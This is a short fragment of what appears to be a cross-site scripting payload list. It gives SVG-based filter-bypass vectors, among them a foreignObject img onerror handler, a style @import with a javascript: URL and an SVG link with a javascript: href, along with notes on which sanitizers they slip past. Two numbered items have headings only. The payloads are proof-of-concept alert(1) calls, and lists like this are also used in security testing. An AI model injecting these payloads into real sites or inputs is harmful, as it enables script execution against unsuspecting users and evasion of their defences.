## 5) SVG with <script> (still executes when svg parsed inline)

## 6) foreignObject (XHTML context - reliable inside IE/Edge/Safari sanitized paths)
<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></div></foreignObject></svg>

## 7) Animation / SMIL trigger (no script blocked - animate attribute runs JS handler)

## 8) Style/import injection (IE historic, some filters miss)
<svg><style>@import url('javascript:alert(1)');</style></svg>

## 9) JS protocol in svg context
<svg><a xmlns="http://www.w3.org/2000/svg" href="javascript:alert(1)"><text x=20 y=20>click</text></a></svg>
